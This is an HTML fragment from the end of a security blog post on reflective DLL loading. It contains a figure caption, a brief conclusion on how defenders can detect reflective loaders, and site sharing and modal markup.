srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig19_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367434&amp;s=2040f99e99bb7fd550ebb7ccf9260daa, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig19_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1713367434&amp;s=973e7386e59989c605213c58d1ac1dfd 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig19_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367434&amp;s=501060f089ecdf0317e4b0b2fb75013b, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig19_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367434&amp;s=997e46aa82306bf3905d9eaad0e2766c 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/DLL_Reflections_Nusbaum/Fig19_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1713367434&amp;s=501060f089ecdf0317e4b0b2fb75013b" loading="lazy" x-data="image({mq1024:{width:936,height:426},mq768:{width:936,height:426},mq320:{width:720,height:328},DEFAULT:{width:320,height:146}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="426" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 19 - DnSpy Generated Source Code for the reflective_loader Function</figcaption></figure></div><h2>1.5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Conclusion</h2><p class="MsoNormal">Reflective Loaders are a great tool for attackers and a pain for defenders. Some of the ways that defenders can detect or prevent would be to identify new memory allocations that are created with RWX permissions. Most allocated memory does not need the execute permission. Another item would be to monitor and capture network traffic; however, this isn’t practical as it would involve implementing SLL stripping and storage of large amounts of data.&nbsp;</p><p class="MsoNormal">During the testing of these samples, Windows Defender did not flag any of the stagers but did flag the DLLs execution in memory. The DLL was flagged because it was a generic Metasploit-generated payload.</p></div><div class="mb-p24 mt-p56 pt-p32 border-t first:border-t-none"><div class="w-full"><p id="share-label" class="text-xs font-mono mb-p16">Share</p><ul id="share-icons" class="flex items-center" aria-describedby="share-label"><li class="ml-p12"><a href="https://trustedsec.com/blog/loading-dlls-reflections" target="_blank" title="Share URL" data-target="https://trustedsec.com/blog/loading-dlls-reflections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-share"></use></svg></span><span class="sr-only">Share URL</span></a></li><li class="ml-p12"><a href="mailto:?subject=Check%20out%20this%20article%20from%20TrustedSec%21&amp;body=Loading%20DLLs%20Reflections%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Floading-dlls-reflections" target="_blank" title="Share via Email" data-target="https://trustedsec.com/blog/loading-dlls-reflections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-email"></use></svg></span><span class="sr-only">Share via Email</span></a></li><li class="ml-p12"><a href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Floading-dlls-reflections" target="_blank" title="Share on Facebook" data-target="https://trustedsec.com/blog/loading-dlls-reflections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-facebook"></use></svg></span><span class="sr-only">Share on Facebook</span></a></li><li class="ml-p12"><a href="http://twitter.com/share?text=Loading%20DLLs%20Reflections%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Floading-dlls-reflections" title="Share on X" rel="nofollow" data-target="https://trustedsec.com/blog/loading-dlls-reflections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-twitter"></use></svg></span><span class="sr-only">Share on X</span></a></li><li class="ml-p12"><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Floading-dlls-reflections&amp;mini=true" target="_blank" title="Share on LinkedIn" data-target="https://trustedsec.com/blog/loading-dlls-reflections"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-linkedin"></use></svg></span><span class="sr-only">Share on LinkedIn</span></a></li></ul></div></div></div></div></div></div></section></div>
		</main>

		
		




  
<div class="c-modal fixed inset-0 z-100" x-comp="modal" x-data="modal({id:'modal-component'})" x-show="$store.modal.show" x-trap="$store.modal.show" x-bind:aria-hidden="!$store.modal.show" @keydown="keyPress($event)" x-transition:enter="c-modal-enter" x-transition:enter-start="c-modal-enter-start" x-transition:enter-end="c-modal-enter-end" x-transition:leave="c-modal-leave" x-transition:leave-start="c-modal-leave-start" x-transition:leave-end="c-modal-leave-end" aria-hidden="true" style="display: none;">
    <div class="w-full h-full bg-overlay fixed inset-0 z-0" tabindex="-1">

    <div class="relative z-10 flex flex-col w-full h-full justify-center items-center p-p12 mq768:p-none">
      <div id="modal-component" class="c-modal-box relative outline-none false w-full m-p24 max-w-p768" :class="modalClass(true)" :tabindex="($store.modal.show) ? '-1' : false" :aria-labelledby="showHeading() ? 'modal-component-title' : false" :aria-label="getLabel()" @focus="activate()" aria-role="dialog" x-ref="dialog">
        
          
        
        
          <div class="c-content p-p32" tabindex="-1" x-ref="content"></div>
        
        <button class="absolute z-50 overflow-hidden w-p24 h-p24 flex items-center justify-center border-black border top-p24 right-p24 group hover:bg-black" @click="closeModal()">
          <svg role="presentation" class="c-icon h-p12 w-p12 group-hover:fill-white"><use xlink:href="/ui/icons.svg?1.26#icon-close"></use></svg>
          <span class="sr-only">Close</span>
        </button>
        <button x-show="$store.modal.transcript" class="text-btn text-white uppercase tracking-widest px-p8 py-p16" @click="showTranscript($event)" x-text="$store.modal.showTranscript ? 'Hide Transcript' : 'Show Transcript'" style="display: none;">Show Transcript</button>
      </div>
      <div x-show="$store.modal.showTranscript" class="relative -top-ms bg-white text-segment w-full max-w-p768 mx-auto overflow-auto px-sm false m-p24" :class="modalClass()" x-ref="transcript" style="display: none;">
        <div x-collapse.duration.700ms="" style="height: 0px; overflow: hidden;">
          <div class="py-p32 mq768:px-p32" id="modal-transcript" tabindex="0"></div>
        </div>
      </div>
    </div>

  </div>
  </div>
		<!-- Start cookieyes banner --> 
 
<!-- End cookieyes banner -->

		
	


</body></html>